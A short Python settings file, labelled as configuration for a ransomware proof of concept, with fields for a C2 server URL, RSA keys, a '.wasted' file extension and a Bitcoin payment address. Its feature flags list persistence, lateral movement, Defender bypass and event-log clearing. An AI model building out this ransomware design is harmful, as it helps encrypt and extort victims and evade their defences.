# Configuration management for ransomware PoC
from pydantic_settings import BaseSettings
from typing import Optional

class AppConfig(BaseSettings):
    """
    Application configuration loaded from environment variables or .env file.
    """
    c2_server_url: str
    encryption_key_path: str
    log_level: str = "INFO"
    environment: str = "development"
    timeout: int = 30
    hardcoded_key: Optional[str] = None
    decrypt_code: Optional[str] = None
    server_public_rsa_key: Optional[str] = None
    server_private_rsa_key: Optional[str] = None
    rsa_private_key_path: Optional[str] = "c2_private_key.pem"
    extension: Optional[str] = ".wasted"
    host: Optional[str] = "127.0.0.1"
    port: Optional[int] = 8080
    payment_address: Optional[str] = "1BitcoinEaterAddressDontSendf59kuE"

    # Phase feature flags
    enable_utils: bool = True       # Phase 1: shell helpers, VM detection, shadow copy
    enable_persistence: bool = False  # Phase 2: registry Run key, startup, mutex
    enable_spread: bool = False    # Phase 3: lateral movement
    enable_c2_tls: bool = False    # Phase 4: TLS C2 (needs cert setup)
    enable_stealth: bool = False   # Phase 5: Defender bypass, event log clearing

    class Config:
        env_file = ".env"
        env_file_encoding = "utf-8"
        extra = "allow" 